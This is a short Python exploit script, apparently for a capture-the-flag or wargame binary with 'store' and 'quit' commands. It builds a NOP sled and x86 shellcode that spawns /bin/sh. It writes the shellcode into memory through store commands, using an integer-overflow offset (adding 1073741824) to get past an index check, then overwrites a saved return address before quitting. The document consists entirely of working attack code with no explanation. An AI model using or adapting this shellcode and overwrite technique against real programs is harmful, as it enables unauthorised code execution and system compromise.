shellcode = [0x90909090] * 69

shellcode += [
    0x6850C031,
    0x68732F2F,
    0x69622F68,
    0xB0E3896E,
    0x31C9310B,
    0x0080CDD2,
]

for i, j in enumerate(shellcode):
    print("store", j, i if i % 3 else i + 1073741824, sep="\n")

print("store", 0xFFFFDC24 + 200, 1073741824 + 114, "quit", sep="\n")
